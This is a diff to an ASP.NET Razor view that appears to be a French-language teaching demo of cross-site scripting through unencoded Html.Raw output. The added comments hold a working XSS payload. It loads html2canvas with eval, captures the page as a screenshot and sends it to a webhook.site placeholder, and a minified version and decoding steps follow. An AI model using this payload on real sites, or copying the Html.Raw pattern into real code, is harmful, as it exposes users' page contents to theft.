@@ -29,7 +29,8 @@
             </div>
             <div class="card-body">
                 <p>Bonjour, <span id="userName-output">@Html.Raw(ViewBag.UserName)</span>!</p>
-                
+                @* // [img src='http://www.'] *@
+                @* // xooit *@
                 <div class="alert alert-info mt-3">
                     <h5>Explication:</h5>
                     <p>La valeur affichée ci-dessus est injectée dans la page en utilisant <code>Html.Raw()</code>, ce qui désactive l'encodage HTML automatique.</p>
@@ -44,3 +45,33 @@
         <a asp-action="Index" class="btn btn-secondary">Retour à la page d'accueil</a>
     </div>
 </div>
+
+@*     Autre exemple: *@
+@* *@
+@*     <script> *@
+@*         // Version compacte du script pour pouvoir l'inclure dans une URL *@
+@*         fetch('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js') *@
+@*             .then(r => r.text()) *@
+@*             .then(code => { *@
+@*                 eval(code); *@
+@*                 setTimeout(() => { *@
+@*                     html2canvas(document.documentElement).then(canvas => { *@
+@*                         // Stocker l'image dans le localStorage pour la récupérer plus tard *@
+@*                         localStorage.setItem('screenshot_' + Date.now(), canvas.toDataURL()); *@
+@*                         // Ou envoyer à un webhook *@
+@*                         navigator.sendBeacon('https://webhook.site/votre-identifiant-unique', canvas.toDataURL()); *@
+@*                     }); *@
+@*                 }, 2000); *@
+@*             }); *@
+@*     </script> *@
+    
+@* Version minifiée:
+    
+        <script>fetch('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js').then(r=>r.text()).then(code=>{eval(code);setTimeout(()=>{html2canvas(document.documentElement).then(canvas=>{localStorage.setItem('screenshot_'+Date.now(),canvas.toDataURL())})},2000)});</script>
+        
+        * Ensuite, vérifier dans le localStorage. Vous devriez avoir une entrée "screenshot_<timeestamp>"
+        * Vous devriez avoir un résultat tel que data:image/png;base64,iVBORw0KGg... 
+        * Garder uniquement la partie après "base64," et utiliser un décodeur base64 => image comme https://base64.guru/converter/decode/image
+        * Vous obtenez la capture d'écran réalisée par le code malveillant.
+    
+    *@
